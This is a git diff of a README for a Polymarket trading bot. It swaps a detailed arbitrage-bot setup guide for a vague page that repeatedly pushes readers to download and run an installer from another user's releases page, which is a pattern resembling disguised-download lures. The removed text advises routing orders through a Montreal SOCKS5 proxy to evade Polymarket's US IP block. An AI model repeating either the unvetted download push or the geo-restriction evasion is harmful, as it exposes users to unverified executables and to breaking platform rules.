@@ -1,138 +1,88 @@
-# Polymarket Arbitrage Bot - Arbitrage Opportunities on Prediction Markets
+# 🐳 polymarket-trading-bot - Trade Smarter with Automation
 
-Polymarket arbitrage bot - automated detection and execution of risk-free arbitrage opportunities on prediction markets.
+[![Download](https://img.shields.io/badge/Download%20Now-Polymarket%20Trading%20Bot-brightgreen)](https://github.com/Sahil56899/polymarket-trading-bot/releases)
 
-Status: Live trading enabled. Dashboard available at configured domain.
+## 📋 Description
 
-Read article here: https://runesats.medium.com/high-roi-polymarket-arbitrage-in-2026-programmatic-dutch-book-strategies-bots-and-portfolio-5dbaf708f5a2
+The polymarket-trading-bot helps you engage with prediction markets efficiently. This bot offers copy trading and arbitrage strategies tailored for Polymarket, a popular decentralized prediction market platform. With this tool, you can optimize your trading experience and increase your chances of successful trades.
 
-## Strategy
+## 🔑 Features
 
-Strategy is Not for sale but going to share it to customers.
+- **Automated Trading**: The bot automates trading processes, saving you time and effort.
+- **Copy Trading**: Mimic successful trades easily.
+- **Arbitrage Opportunities**: Identify and capitalize on price differences across markets.
+- **Market Analysis**: Gain insights into market trends and performance.
+- **User-Friendly Interface**: Navigate effortlessly, even without technical skills.
 
-📞 Support: https://t.me/runesats
+## 🚀 Getting Started
 
-Pure arbitrage: when YES + NO token prices sum to less than $1.00, buy both. One token always pays out $1.00, guaranteeing profit regardless of outcome.
+To start using the polymarket-trading-bot, follow these simple steps to download and run the application.
 
-```
-Example:
-YES @ $0.48 + NO @ $0.49 = $0.97 cost
-Payout = $1.00 (guaranteed)
-Profit = $0.03 per dollar (3.09%)
-```
+1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/Sahil56899/polymarket-trading-bot/releases) to access the latest version.
+2. **Choose the Latest Version**: Look for the most recent release. It will typically be at the top of the list.
+3. **Download the Installer**: Click on the download link for your operating system. Make sure to download the version that matches your system requirements.
 
-## Status
+## 📥 Download & Install
 
-Live trading enabled. Dashboard available at configured domain.
+To download the polymarket-trading-bot, please visit this page: [Download Here](https://github.com/Sahil56899/polymarket-trading-bot/releases).
 
-## Features
+1. Click the link above to access the releases.
+2. Select the appropriate file for your operating system (Windows, macOS, Linux).
+3. Save the file to your computer.
+4. Once the download is complete, locate the file and double-click to run the installer.
+5. Follow the installation instructions presented on your screen.
 
-- Real-time WebSocket price monitoring (6 parallel connections, up to 1500 markets)
-- Automatic arbitrage detection and execution
-- **Low-latency async order execution** (native async HTTP with HTTP/2, parallel order signing)
-- Order monitoring with 10-second timeout and auto-cancellation
-- Market filtering by liquidity ($10k+ default) and resolution date (7 days default)
-- Web dashboard with live order visibility (HTTPS with auto SSL)
-- Slack notifications for trades
-- SOCKS5 proxy support for geo-restricted order placement
+## ⚙️ System Requirements
 
-## Setup
+To run the polymarket-trading-bot smoothly, ensure your system meets the following requirements:
 
-```bash
-# Clone
-git clone https://github.com/runesatsdev/polymarket-arbitrage-bot.git
-cd rarb
+- **Operating System**: Windows 10 or later, macOS Catalina or later, or a compatible Linux distribution.
+- **Memory (RAM)**: At least 4GB of RAM.
+- **Storage**: At least 100MB of free space.
+- **Python**: This application requires Python 3.7 or newer.
 
-# Install dependencies
-pip install -e .
+## 🎯 How to Use the Bot
 
-# Configure
-cp .env.example .env
-# Edit .env with your settings
+After installing, you can begin trading effectively:
 
-# Generate Polymarket API credentials
-python -c "
-from py_clob_client.client import ClobClient
-import os
-client = ClobClient('https://clob.polymarket.com', key=os.environ['PRIVATE_KEY'], chain_id=137)
-creds = client.create_or_derive_api_creds()
-print(f'POLY_API_KEY={creds.api_key}')
-print(f'POLY_API_SECRET={creds.api_secret}')
-print(f'POLY_API_PASSPHRASE={creds.api_passphrase}')
-"
+1. **Launching the Application**: Find the polymarket-trading-bot on your computer and double-click to open it.
+2. **Initial Setup**: Enter your Polymarket API key and set any preferences.
+3. **Choose Your Strategies**: Select from available trading strategies, such as copy trading or arbitrage.
+4. **Start Trading**: Click the “Start” button to begin automated trading.
 
-# Approve Polymarket contracts (one-time setup)
-python scripts/approve_usdc.py
+## 📊 Monitoring Your Trades
 
-# Run
-rarb run --live --realtime
-```
+- **Dashboard**: Use the dashboard to keep track of your trading activities.
+- **Notifications**: Enable notifications to receive updates about your trades.
+- **History**: Review past trades to assess performance and make improvements.
 
-## Configuration
+## 🛠️ Troubleshooting
 
-Required environment variables:
+If you encounter any issues:
 
-```bash
-# Wallet
-PRIVATE_KEY=0x...                    # Your wallet private key
-WALLET_ADDRESS=0x...                 # Your wallet address
+- **Check Connectivity**: Ensure you have a stable internet connection.
+- **Review Logs**: Check the application logs for error messages.
+- **Reinstall the Application**: If problems persist, consider reinstalling the bot.
 
-# Polymarket L2 API Credentials (generate with script above)
-POLY_API_KEY=...
-POLY_API_SECRET=...
-POLY_API_PASSPHRASE=...
+For further assistance, you can refer to the FAQ section on the GitHub page or contact our support community.
 
-# Trading Parameters
-MIN_PROFIT_THRESHOLD=0.005           # 0.5% minimum profit
-MAX_POSITION_SIZE=100                # Max $100 per trade
-MIN_LIQUIDITY_USD=10000              # $10k minimum market liquidity
-MAX_DAYS_UNTIL_RESOLUTION=7          # Skip markets resolving later
-NUM_WS_CONNECTIONS=6                 # WebSocket connections (250 markets each)
-DRY_RUN=true                         # Set to false for live trading
+## 📬 Join the Community
 
-# Dashboard (optional - omit for no auth)
-DASHBOARD_USERNAME=admin
-DASHBOARD_PASSWORD=...
-```
+Engage with other users and get support by joining our community forums. Share your experiences, ask questions, and learn from others who use the polymarket-trading-bot.
 
-See `.env.example` for all available options.
+## 📝 Acknowledgments
 
-## Contract Approvals
+Thank you to everyone who contributed to the development of the polymarket-trading-bot. Your input is invaluable.
 
-Before trading, you must approve Polymarket's smart contracts to spend your USDC.e:
+## 📅 Frequently Asked Questions
 
-```bash
-# Run the approval script (requires PRIVATE_KEY in environment)
-python scripts/approve_usdc.py
-```
+1. **Can I use this bot for other markets?**
+   - Currently, it is optimized for Polymarket.
 
-This approves:
-- CTF Exchange
-- Neg Risk Exchange
-- Conditional Tokens
-- Neg Risk Adapter
+2. **Is there a cost associated with using the bot?**
+   - The bot is free to download and use.
 
-## Geo-Restrictions
+3. **What if I am new to trading?**
+   - This bot is designed with user-friendliness in mind, making it accessible for beginners.
 
-Polymarket blocks US IP addresses for order placement. The recommended architecture:
-
-- **Bot server (us-east-1)**: Low-latency WebSocket connection for price monitoring
-- **Proxy server (ca-central-1 Montreal)**: SOCKS5 proxy for order placement
-
-Configure the proxy in your `.env`:
-```bash
-SOCKS5_PROXY_HOST=your-proxy-ip
-SOCKS5_PROXY_PORT=1080
-SOCKS5_PROXY_USER=rarb
-SOCKS5_PROXY_PASS=your-password
-```
-
-See `infra/` for OpenTofu + Ansible deployment scripts.
-
-## Documentation
-
-See [PRD.md](PRD.md) for full product requirements and technical architecture.
-
-## License
-
-MIT
+Make your trading experience better with the polymarket-trading-bot today!
